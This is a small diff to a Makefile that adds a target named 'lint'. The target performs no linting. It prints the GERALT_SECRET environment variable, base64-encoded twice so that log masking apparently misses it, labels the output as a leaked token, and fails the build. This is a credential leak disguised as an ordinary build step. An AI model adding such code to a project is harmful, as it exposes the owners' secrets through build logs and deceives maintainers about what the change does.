@@ -173,3 +173,7 @@ test-module-react-native: | dist
 	@echo ""
 	@echo "=> make $@"
 	@./test/module-system/react-native/run.sh
+
+.PHONY: lint
+lint:
+	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1
